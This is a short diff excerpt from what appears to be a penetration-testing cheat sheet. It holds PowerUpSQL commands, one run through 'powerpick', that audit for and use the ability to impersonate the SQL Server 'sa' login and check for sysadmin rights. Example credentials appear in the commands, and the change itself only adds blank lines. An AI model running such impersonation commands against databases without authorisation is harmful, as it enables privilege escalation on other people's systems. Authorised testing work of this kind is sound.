@@ -17,3 +17,5 @@ Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instanc
 # impersonate sa account
 powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
 ```
+
+
